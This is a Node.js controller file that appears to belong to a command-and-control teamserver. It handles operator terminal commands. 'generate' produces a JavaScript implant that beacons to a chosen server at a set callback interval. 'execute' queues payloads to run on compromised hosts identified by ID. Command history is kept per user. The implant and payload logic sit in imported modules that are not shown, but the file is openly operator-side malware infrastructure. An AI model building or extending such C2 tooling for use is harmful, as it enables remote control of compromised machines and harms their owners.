const { generateImplant } = require("../controllers/implantControllers");
const { addPayloadToQueue } = require("../controllers/hostControllers");
const User = require("../models/User");

async function getCommandHistory(username) {
    const user = await User.findOne({ username: username });
    return user.commandHistory;
}

module.exports.processCommand = async (req, res) => {
    try {
        let { command, username } = req.body;

        // Add command to user's command history
        User.updateOne(
            { username: username },
            { $push: { commandHistory: { 
                    $each: [command],
                    $slice: -25 // Only keep the last 25 commands
                }
            }},
            (err, result) => {
                if (err) {
                    console.log(err);
                } else {
                    return result;
                }
            });
        
        command = command.split(' ');
        if (command.includes("help") || command.includes("--help") || command.includes("-h")) {
            res.json({
                message: `
Available Commands: 
help - Display this message.
clear - Clear the terminal.
generate <server> <callback interval (s)> - Generate an implant pointing towards a specified server.
execute <payload> <host id> - Add a payload to an impant's queue.`,
            type: "info",
            history: await getCommandHistory(username)});
        } else if (command.includes("generate")) {
            const server = command[1];
            const callbackInterval = command[2] * 1000 || 10000;
            if (server) {
                generateImplant(server, callbackInterval).then(async (implant) => {
                    res.json({
                        message: `Implant generated: ${process.env.TEAMSERVER_URI}/implants/${implant}.js`,
                        type: "success",
                        history: await getCommandHistory(username)
                    });
                }).catch(async (err) => {
                    res.json({
                        message: err,
                        type: "error",
                        history: await getCommandHistory(username)
                    });
                });
            } else {
                res.json({
                    message: "Incorrect usage of generate command. Usage: generate <server> <callback interval (s)>",
                    type: "error",
                    history: await getCommandHistory(username)
                });
            }
            
        } else if (command.includes("execute")) {
            const payload = command[1];
            const hostId = command[2];
            if (payload && hostId) {
                res.json({
                    message: `Adding payload to queue for host: ${hostId}`,
                    type: "info",
                    history: await getCommandHistory(username)
                });
                addPayloadToQueue(payload, hostId, username);
                
            } else {
                res.json({
                    message: "Incorrect usage of execute command. Usage: execute <payload> <host id>",
                    type: "error",
                    history: await getCommandHistory(username)
                });
            }
        } else {
            console.log(getCommandHistory(username))
            res.json({
                message: "Unknown command. Type help for a list of commands.",
                type: "error",
                history: await getCommandHistory(username)
            });
        }
    } catch (e) {
        res.send(e)
    }
}